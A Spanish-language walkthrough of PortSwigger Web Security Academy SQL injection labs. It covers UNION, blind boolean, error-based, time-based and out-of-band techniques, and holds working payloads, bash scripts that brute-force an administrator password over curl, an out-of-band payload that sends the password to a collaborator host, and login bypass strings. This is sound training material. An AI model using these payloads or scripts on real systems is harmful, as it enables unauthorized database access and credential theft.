---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# SQL Injection (Labs)

## SQLI UNION attack

### Determining the number of columns returned by the query

Tenemos en primer lugar una tienda con productos y filtros:

![Tienda con filtros y productos](<../.gitbook/assets/image (22) (1) (1).png>)

Así que tras probar tanto pulsando en productos cómo en los filtros podemos ver las siguientes URLs.

```
filter?category=Food+%26+Drink
product?productId=1
```

Por lo que ambas pueden parecer susceptibles de ser inyectadas a través de GET, si probamos en la de filtros:

```
filter?category=Food+%26+Drink' or 1=1--
```

Vemos como se aplican todos y cada uno de los filtros, por lo que ya tenemos la URL inyectable. Ahora simplemente tenemos que elegir la opción que queramos para acabar, aunque el laboratorio sólo te da la siguiente cómo válida

```
filter?category=' union select null, null, null--
```

### Finding a column containing text

Muy sencillito tras hacer el anterior, tenemos que tener en cuenta que no todos los campos que añadimos a union select pueden soportar todos los caracteres distintos. Esto quiere decir que en ocasiones si queremos un output de una string tendremos que encontrar un campo compatible.

En este caso vemos que la vulnerabilidad la seguimos teniendo en el filtro:

```
filter?category=' union select null, null, null--
```

Por lo que tenemos que buscar en que parámetro nos permite utilizar la palabra que se ha generado, en mi caso "PscilI":

```
filter?category=' union select null, PscilI, null--
```

Es la única posición en la que se puede poner una string.

### Retrieving data from other tables

Volvemos a nuestra tienda, en esta ocasión para comenzar a sacar datos. Volvemos a tener la vulnerabilidad en los filtros, pero en esta ocasión son comentarios y únicamente son dos null, además de que ambas parece que pueden devolvernos una string.

```
filter?category='union select 'string', 'string' --
```

Cómo al principio del ejercicio nos dicen que podemos obtener un usuario y una contraseña de la tabla users podemos directamente imprimir todos aprovechándonos además de ambos campos.

```
filter?category=' union select username, password from users--

#Si solo tuviésemos un campo válido
filter?category=' union select CONCAT(username, ':', password), null from users--
```

Realizamos login con el usuario administrador y nos da por válido el laboratorio.

### Retrieving multiple values in a single column

Sin querer lo hemos medio chivado antes, en esta ocasión sólo hay un campo válido así que podemos concatenar.

```
filter?category=' union select null, CONCAT(username, ':', password) from users--

#La opción que te da PortSwigger es:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

Logueamos como administrador y acabamos.

### Querying the database type and version on Oracle

En esta ocasión tenemos Oracle ¿Qué debemos tener en cuenta?

|        Uso       | Comando                                                                   |
| :--------------: | ------------------------------------------------------------------------- |
|    Comentario    | --comentario                                                              |
| Versión de la BD | <p>SELECT banner FROM v$version </p><p>SELECT version FROM v$instance</p> |
|    Concatenar    | 'foo'\|\|'bar'                                                            |

También existe un tema importante y es el hecho de que cuando tenemos una DB Oracle delante nuestros union select tienen que ir acompañados de un FROM. Por ejemplo se puede utilizar FROM dual ya que es una tabla por defecto de Oracle. Sin utilizar el FROM no podremos determinar el número de columnas.

```
filter?category='union select null,null from dual--
```

Ahora simplemente usando la cheatsheet de arriba sabemos cómo obtenerlo:

```
filter?category='union select banner,null from v$version--
```

### Querying the database type and version on MySQL and Microsoft

Tremendamente fácil

```
filter?category=' union select version(), null-- -
```

### Listing the database contents on non-Oracle databases

Aquí es donde podemos empezar a aprender a listar diferentes detalles de las bases de datos:

```
#Los nombres de todas las bases de datos
' union select schema_name, null from information_schema.schemata-- -

#Podemos obtener todas las tablas o aquellas de bases de datos concretas
' union select table_name, null from information_schema.tables where table_schema='public'-- -

#A continuación columnas
' union select column_name, null from information_schema.columns where table_name='users_htqqgf' and table_schema='public'-- -

#Por último los datos
' union select CONCAT(username_tgaepb,':',password_kkmkfa),null from users_htqqgf-- - 
```

### Listing the database contents on Oracle

Es similar a las bases de datos Mysql pero con pequeñas diferencias.

```
#Obtener las tablas
' union select table_name, null from all_tables--

#Obtener las columnas
' union select column_name, null from all_tab_columns where table_name='USERS_NKHBTW'--

#Obtener los datos
' union select USERNAME_TIOZOM||':'||PASSWORD_SRGLLK, null from USERS_NKHBTW--
```

## Blind SQLI attack

En esta ocasión nos va a tocar inyectar SQL dentro de una Cookie (Muy interesante por cierto) Así que vamos a por ello.

Si nosotros introducimos la cookie seguido de lo siguiente vemos un mensaje de Welcome Back

```
cookie' and 1=1-- -
```

Y si es incorrecta la sentencia no aparece dicho mensaje:

```
cookie' and 1=2-- -
```

Por lo que ya sabemos la manera de inyectar, lo que ocurre que estamos ante una inyección ciega, esto quiere decir que vamos a tener que hacer preguntas a la base de datos para determinar cómo continuar.

En primer lugar a mi me parece interesante averiguar qué base de datos está detras, es cierto que con el comentario propio de Mysql ha funcionado, pero es que dicho comentario funciona en todas, por lo que vamos a probar a quitar el espacio tras los guiones:

```
cookie' and 1=1--
```

Y sigue funcionando, por lo que en principio podemos descartar que estemos ante MYSQL, pero ¿Cuál de las demás será? Podríamos utilizar inyecciones basadas en tiempo para determinarlo:

```
cookie' RLIKE sleep(5)-- - #Mysql no es necesaria ya que la hemos descartado
cookie' and 1234=(select 1234 from pg_sleep(5))-- #PostgreSQL
```

No hay que buscar más, estamos ante una PostgreSQL ya que ha funcionado el Payload de tiempo.

Parece ser que tenemos una tabla llamada _users_ con unas columnas llamadas _username_ y _password_. Y tenemos que encontrar la contraseña del usuario _administrator_.

Entonces no hace falta que busquemos las tablas y las columnas, podemos ir directamente a buscar la contraseña del usuario que nos piden.

```
cookie' and (select substring(password,1,1) from users where username='administrator')='w'--
```

Podríamos hacerlo de esta manera, ir preguntando a la base de datos carácter a carácter hasta sacar la contraseña del usuario administrador. Sabemos que cada vez que sea correcta la letra nos dirá _Welcome back_.

Una forma de hacerlo sería enviarlo al intruder de Burpsuite y que se encargue de las comprobaciones, pero para hacerlo de esta manera lo ideal sería saber el número de caracteres que tiene la contraseña.

```
cookie' and (select 'a' from users where username='administrator' and length(password)>10)='a'--
cookie' ' and (select 'a' from users where username='administrator' and length(password)=20)='a'--
```

Cómo podéis ver es ir preguntando si es mayor que, os recomiendo ir de 5 en 5 y podéis confirmar como he hecho yo si efectivamente son 20. Así que ya podemos enviar esto al intruder de Burpsuite.

![Intruder de Burpsuite](<../.gitbook/assets/image (24) (1) (1).png>)

El tipo de ataque es un Cluster Bomb para conseguir iterar correctamente entre los dos parámetros que hemos marcado.

A continuación en Payloads tendremos que poner letras y números al segundo parámetro y números del 1 al 20 al primer parámetro. Por otro lado en grep extract por facilitarnos el trabajo marcaremos el mensaje de _Welcome Back_ para verlo durante el ataque.

Es cierto que funcionar funciona, lo podéis ver en la siguiente imagen, pero el problema real está en que con la Community Edition de Burpsuite te eternizas para algo que podría sacarse en pocos segundos. Si sois nuevos en todo este mundillo como yo os recomiendo que hagáis vuestros propios scripts siempre que podáis. De esta manera entendéis mejor que estáis haciendo y por otro lado aprendéis más y cogéis soltura.

![Intruder de Burpsuite](<../.gitbook/assets/image (21) (1).png>)

Así que he preferido hacer mi propio script.

```bash
#!/bin/bash
respuesta=""
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
	for a in a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0; do
		respuesta=$(curl -s https://acd41f5f1e23489cc0d125c200da008b.web-security-academy.net/ --cookie "TrackingId=pvJaKsOkvLKbfdv4' and (select substring(password,$i,1) from users where username='administrator')='$a'--" | grep -o Welcome)
		if [ "$respuesta" == "Welcome" ]; then
			echo "$i letra es $a"
			pass=$pass$a
			break
		fi
		respuesta=""
	done
	respuesta=""
done
echo $pass
```

Nada del otro mundo, dos bucles uno para cada argumento que va a ir cambiando y un output, ni está bonito ni es el mejor, pero en un par de minutos estaba hecho.

![Salida de mi script](<../.gitbook/assets/image (27) (1) (1) (1).png>)

Otro más acabado, así que a por el siguiente.

### Blind SQL injection with conditional errors

Seguimos teniendo la vulnerabilidad en la misma cookie que el anterior así que partimos de ahí.

Si introducimos una comilla simple ' vemos cómo aparece un error mientras que si comentamos el resto desaparece el error.

```
cookie' #Error
cookie' -- #Sin error
```

Aquí tenemos que intentar comprobar que pasa cuando se da una sentencia falsa frente a una cierta:

```
' and 1=(select '1')-- #Nos da un error
' and 1=(select '1' from dual)-- #No nos da error
' and 1=(select '2' from dual)-- #No nos da error
```

Aquí ya determiné que la BD es Oracle, porque necesito especificar una tabla como dual de Oracle para que la sentencia sea correcta. Pero cómo vemos aunque la sentencia sea cierta o sea falsa no nos da el error. Es decir, únicamente muestra el error en caso de que la sintaxis no sea correcta.

Esto es importante ya que no podemos realizarlo cómo en el ejemplo anterior en el que dependía de si la sentencia era o no correcta, por lo que ahora tenemos que utilizar los errores a nuestro favor.

Eso sí tras varios intentos fui incapaz de encontrar una sentencia con AND que me sirviese por lo que empecé a utilizar concatenaciones, por ejemplo aquí abajo confirmamos que existe la tabla Users al no mostrar error.

```
' || (select '' from users where rownum = 1)--
```

De todas maneras haciendo alguna que otra prueba con Sqlmap veo que si se podría realizar mediante un AND:

```
' AND (SELECT (CASE WHEN (9322=9322) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3029) END) FROM DUAL) IS NULL-- 

#Aunque prefiero complicarme algo menos con una sentencia tipo:
' and (select (case when (1=1) then null else to_char(1/0) end) from dual) is null--
```

El uso de to\_char(1/0) es para que al intentar dividir 1/0 nos salte un error, de esta manera cuando el caso es cierto será null y la sentencia será correcta, pero en caso contrario intentará dividir 1/0 y esto provocará un error.

Por lo que teniendo posibles sentencias ya podemos empezar a hacer preguntas, utilizamos los condicionales para que nos salte un error o no en función de si es cierta o falsa.

Por ejemplo, sabemos que tenemos una tabla users con un username=administrator del que queremos el dato de la columna password. Por lo que podríamos hacer la pregunta de la longitud igual que antes (voy a deducir en este caso de primeras que es 20).

```
' and (select (case when (length(password)=20) then null else to_char(1/0) end) from users where username='administrator') is null--
```

Efectivamente nos aparece cómo correcto, por lo que sabemos la longitud de la contraseña, así que podemos hacer al igual que hicimos en el ejercicio anterior un script preguntando cada letra, basándonos en la siguiente petición:

```
' and (select (case when (substr(password,1,1)='a') then null else to_char(1/0) end) from users where username='administrator') is null--
```

El script veréis que es muy parecido el anterior que hicimos, cambié también el orden del condicional para provocar un error cuando la respuesta fuese correcta ya que me resultó más simple y también cambié la forma de mostrar el output:

```bash
#!/bin/bash
respuesta=""
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
	for a in a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0; do
		respuesta=$(curl -s https://ac731fad1fb26a26c0447709006600c7.web-security-academy.net/ --cookie "TrackingId=d86onbpvTX2prIDC' and (select (case when (substr(password,$i,1)='$a') then to_char(1/0) else null end) from users where username='administrator') is null--" | grep -o Internal)
		if [ "$respuesta" == "Internal" ]; then
			pass=$pass$a
			echo -ne "$pass\r"
			break
		fi
		respuesta=""
	done
	respuesta=""
done
echo $pass
```

![Output script](<../.gitbook/assets/image (26) (1) (1) (1) (1).png>)

Otro más que hemos conseguido.

### Blind SQL injection with time delays

Concatenando distintos payloads de tiempo podemos localizar este SQL Injection:

```
cookie' || pg_sleep(10) --
```

### Blind SQL injection with time delays and information retrieval

Primero comprobamos que es una continuación del anterior, en el sentido de que es la misma BD y el payload se usa de la misma forma, y efectivamente lo es.

Por lo que realmente podemos hacer condicionales teniendo en cuenta ese tiempo, simplemente tenemos que concatenarlo.

```
' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)-- #Espera 10 segundos al ser correcti
' || (select case when (1=2) then pg_sleep(10) else pg_sleep(0) end)-- #No hay espera al ser incorrecto
```

Teniendo esto, sabiendo el nombre de la tabla y de las columnas como antes no tenemos mayor problema.

```
' || (select case when (username='administrator' and substring(password,1,1)='d') then pg_sleep(5) else pg_sleep(0) end from users)--
```

Ahora tendríamos que automatizar esta tarea, vamos a seguir scripteando un poco ;)

```bash
#!/bin/bash
respuesta=""
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
	for a in a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0; do
		tiempo_inicial=$(date +%s)
		respuesta=$(curl -s https://acad1fb41f714d1bc0d903d600d000b0.web-security-academy.net/ --cookie "TrackingId=d86onbpvTX2prIDC' || (select case when (username='administrator' and substring(password,$i,1)='$a') then pg_sleep(5) else pg_sleep(0) end from users)--")
		tiempo_final=$(date +%s)
		let tiempo=$tiempo_final-$tiempo_inicial
		if [ $tiempo -gt 4 ]; then
			pass=$pass$a
			echo -ne "$pass\r"
			break
		fi
		respuesta=""
	done
	respuesta=""
done
echo $pass

```

![Output del script](<../.gitbook/assets/image (28) (1) (1) (1) (1).png>)

Nos quedan pocos ejercicios para acabar, un empujón más.

## Blind SQL Out of band

### Blind SQL injection with out-of-band interaction

En este caso tenemos un problema para realizar el ejercicio, si no tienes Burpsuite Pro no vas a poder utilizar el burpcollaborator, esto implica que no vas a poder ver la petición que se realiza, de todas formas voy a incluir el Payload con el que lo he realizado, para este caso nos servirá pero en el siguiente no ya que necesitaríamos ver la respuesta del servidor.

```
cookie'+||+(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--
```

Al realizar esto realmente lo que estamos haciendo es una petición a un documento externo, entonces en la URL pondríamos un servidor al que tuviésemos acceso para ver las peticiones que se le han realizado.

El problema que por la configuración de Firewall del laboratorio no permite hacerlo al exterior, esto implica que no podemos por ejemplo abrirnos nuestro propio servidor y hacer las peticiones.

### Blind SQL injection with out-of-band data exfiltration

En esta ocasión tenemos que conseguir loguear como usuario administrador, pero como no vamos a tener acceso a las peticiones no podemos. Aún así pongo por aquí el payload para que lo tengáis a mano:

```
'+||+(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+enconding%3d"UTF-8"%3f><!doctype+root+[+<!entity+%25+remote+system+"http%3a//'||(select+password+from+users+where+username%3d'administrator')||'.subdominio.burpcollaborator.net/">+%25remote%3b]>'),'/l')+from+dual)--
```

## Otros

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Muy sencillito, después de todo lo que hemos hecho parece de broma ;). En la URL terminamos con:

```
-1' or 1=1--
```

### SQL injection vulnerability allowing login bypass

Otro muy fácil, hay que loguearse como administrador

```
-1' or username='administrator'--
```
